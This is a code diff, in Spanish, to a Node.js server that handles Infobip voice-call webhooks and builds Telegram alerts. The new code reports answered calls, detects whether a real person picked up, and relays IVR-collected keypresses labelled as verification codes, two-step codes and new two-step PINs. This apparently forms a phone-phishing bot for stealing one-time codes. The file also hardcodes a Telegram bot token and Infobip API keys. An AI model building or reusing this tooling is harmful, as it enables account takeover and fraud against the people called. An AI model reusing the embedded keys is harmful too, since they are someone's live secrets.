@@ -13,8 +13,8 @@ const https = require("follow-redirects").https;
 // =========================
 const TELEGRAM_BOT_TOKEN = "7521128407:AAH2E4SKkAgKiXrkIReQwufyLoQTcRp4bvk"; // Tu token de Telegram
 const PORT = process.env.PORT || 3000;
-const DEFAULT_API_KEY = "App e3daefcc80560f5b41fbaea5f57cf55d-37367689-0e5a-47ad-bf35-7f11679eb55d"; // API Key predeterminada SOLO para el admin
-const INFOBIP_BASE_HOST = "pdl8re.api.infobip.com"; // Host de Infobip
+const DEFAULT_API_KEY = "App f1796d7d007e01f9a84340bdcd4c897f-e2819f12-1751-48ef-924c-5eb50e48b3af"; // API Key predeterminada SOLO para el admin
+const INFOBIP_BASE_HOST = "e52v5r.api.infobip.com"; // Host de Infobip
 
 // =========================
 // ALMACENAMIENTO
@@ -485,83 +485,121 @@ app.post("/infobip-webhook", (req, res) => {
 // =========================
 function processCallEvent(event) {
   let message = "";
-  if (event.type) message += `Evento: ${event.type}\n`;
-  if (event.callId) message += `Call ID: ${event.callId}\n`;
-  if (event.timestamp) message += `Timestamp: ${event.timestamp}\n`;
-  if (event.conferenceId) message += `Conference ID: ${event.conferenceId}\n`;
-  if (event.callsConfigurationId) message += `Calls Configuration ID: ${event.callsConfigurationId}\n`;
-  if (event.bulkId) message += `Bulk ID: ${event.bulkId}\n`;
-  if (event.dialogId) message += `Dialog ID: ${event.dialogId}\n`;
-  if (event.platform) {
-    if (event.platform.entityId) message += `Entity ID: ${event.platform.entityId}\n`;
-    if (event.platform.applicationId) message += `Application ID: ${event.platform.applicationId}\n`;
-  }
+  const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
+  const to = event.to || (event.voiceCall && event.voiceCall.to) || "?";
+  const callId = event.callId || event.bulkId || "?";
+  const timestamp = event.timestamp ? new Date(event.timestamp).toLocaleString("es-CO", {timeZone:"America/Bogota"}) : new Date().toLocaleString("es-CO", {timeZone:"America/Bogota"});
+
+  // Eventos en tiempo real con emojis claros
   if (event.type) {
     switch (event.type) {
-      case "SPEECH_CAPTURED":
-        if (event.properties) {
-          message += `Full text: ${event.properties.fullText}\n`;
-          message += `Matched key phrase: ${event.properties.matchedKeyPhrase}\n`;
-          message += `Confidence: ${event.properties.confidence}\n`;
-          message += `Termination reason: ${event.properties.terminationReason}\n`;
-        }
+
+      case "CALL_STARTED":
+      case "STARTED":
+        message = `📲 *LLAMADA INICIADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
         break;
+
+      case "CALL_RINGING":
+      case "RINGING":
+      case "CALL_PRE_ESTABLISHED":
+        message = `🔔 *LLAMANDO...*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        break;
+
+      case "CALL_ESTABLISHED":
+      case "ESTABLISHED":
+      case "CALL_ANSWERED":
+        message = `✅ *¡LLAMADA CONTESTADA!*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        break;
+
+      case "CALL_FINISHED":
+      case "FINISHED":
+      case "HANGUP":
+      case "CALL_ENDED": {
+        const duration = event.duration || (event.properties && event.properties.duration) || (event.voiceCall && event.voiceCall.duration) || 0;
+        const mins = Math.floor(duration / 60);
+        const secs = duration % 60;
+        message = `📵 *LLAMADA FINALIZADA*\n📞 De: +${from}\n🎯 Para: +${to}\n⏱️ Duración: ${mins}m ${secs}s\n🕐 ${timestamp}`;
+        break;
+      }
+
+      case "CALL_FAILED":
+      case "FAILED":
+      case "NO_ANSWER":
+      case "CALL_NO_ANSWER":
+        message = `❌ *LLAMADA FALLIDA / NO CONTESTÓ*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        break;
+
+      case "CALL_REJECTED":
+      case "REJECTED":
+      case "BUSY":
+        message = `🚫 *LLAMADA RECHAZADA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        break;
+
       case "DTMF_CAPTURED":
       case "DTMF":
-      case "DTMF_RECEIVED":
-        if (event.properties && event.properties.dtmf) {
-          message += `DTMF digit received: ${event.properties.dtmf}\n`;
-        } else {
-          message += "Evento DTMF recibido pero sin dígito.\n";
-        }
-        if (event.properties && typeof event.properties.timeout !== "undefined") {
-          message += `Timeout: ${event.properties.timeout}\n`;
-        }
-        if (event.properties && event.properties.playedContentProperties) {
-          message += `Played duration: ${event.properties.playedContentProperties.duration}\n`;
-          message += `Played completely: ${event.properties.playedContentProperties.playedCompletely}\n`;
-        }
+      case "DTMF_RECEIVED": {
+        const digit = (event.properties && event.properties.dtmf) || "?";
+        message = `🔢 *TECLA PRESIONADA: ${digit}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
         break;
-      case "INPUT_RECEIVED":
-        if (event.properties && event.properties.collectedData) {
-          for (const key in event.properties.collectedData) {
-            message += `Input for ${key}: ${event.properties.collectedData[key]}\n`;
-          }
-        } else {
-          message += "Evento INPUT recibido sin detalles.\n";
-        }
+      }
+
+      case "AMD_RESULT":
+      case "ANSWERING_MACHINE_DETECTION_FINISHED": {
+        const amdResult = (event.properties && event.properties.amdResult) || "DESCONOCIDO";
+        const emoji = amdResult === "HUMAN" ? "👤" : "🤖";
+        message = `${emoji} *DETECCIÓN: ${amdResult === "HUMAN" ? "PERSONA REAL" : "BUZÓN DE VOZ"}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
         break;
+      }
+
+      case "SPEECH_CAPTURED": {
+        const text = (event.properties && event.properties.fullText) || "?";
+        message = `🗣️ *VOZ CAPTURADA*\n💬 Dijo: "${text}"\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        break;
+      }
+
+      case "CALL_RECEIVED":
+      case "RECEIVED":
+        message = `📥 *LLAMADA RECIBIDA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        break;
+
+      case "CALL_MISSED":
+      case "MISSED":
+        message = `📵 *LLAMADA PERDIDA*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        break;
+
       default:
-        if (event.properties) {
-          message += `Properties: ${JSON.stringify(event.properties, null, 2)}\n`;
-        }
+        message = `ℹ️ *EVENTO: ${event.type}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
+        if (event.properties) message += `\n📋 Detalles: ${JSON.stringify(event.properties)}`;
     }
+
   } else if (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.collectedDtmfs) {
-    message += `Bulk ID: ${event.bulkId}\nFrom: ${event.from}\nTo: ${event.to}\n`;
+    // Resumen final con DTMFs recolectados
+    message = `📋 *RESUMEN DE LLAMADA*\n📞 De: +${from}\n🎯 Para: +${to}\n`;
     try {
       let dtmfData = JSON.parse(event.voiceCall.ivr.collectedDtmfs);
       if (dtmfData.initialOption && dtmfData.initialOption !== "null") {
-        message += `Opción inicial presionada: ${dtmfData.initialOption}\n`;
+        message += `\n1️⃣ Opción inicial: ${dtmfData.initialOption}`;
       }
       if (dtmfData.verificationCode && dtmfData.verificationCode !== "") {
-        message += `Código de verificación ingresado: ${dtmfData.verificationCode}\n`;
+        message += `\n🔑 Código ingresado: ${dtmfData.verificationCode}`;
       }
       if (dtmfData.twoStepOption && dtmfData.twoStepOption !== "null") {
-        message += `Opción de dos pasos: ${dtmfData.twoStepOption}\n`;
+        message += `\n2️⃣ Opción segundo paso: ${dtmfData.twoStepOption}`;
       }
       if (dtmfData.twoStepCode && dtmfData.twoStepCode !== "null") {
-        message += `Código de dos pasos ingresado: ${dtmfData.twoStepCode}\n`;
+        message += `\n🔐 Código segundo paso: ${dtmfData.twoStepCode}`;
       }
       if (dtmfData.newTwoStepPin && dtmfData.newTwoStepPin !== "null") {
-        message += `Nuevo PIN configurado: ${dtmfData.newTwoStepPin}\n`;
+        message += `\n📌 Nuevo PIN: ${dtmfData.newTwoStepPin}`;
       }
     } catch (err) {
-      message += "Error parseando los DTMFs: " + err.message + "\n";
+      message += `\nError parseando DTMFs: ${err.message}`;
     }
+    message += `\n🕐 ${timestamp}`;
+  } else {
+    message = `ℹ️ *EVENTO RECIBIDO*\n🕐 ${timestamp}\n📋 ${JSON.stringify(event, null, 2)}`;
   }
-  if (!message || message.trim() === "") {
-    message = "Evento recibido sin detalles: " + JSON.stringify(event, null, 2);
-  }
+
   return message;
 }
 
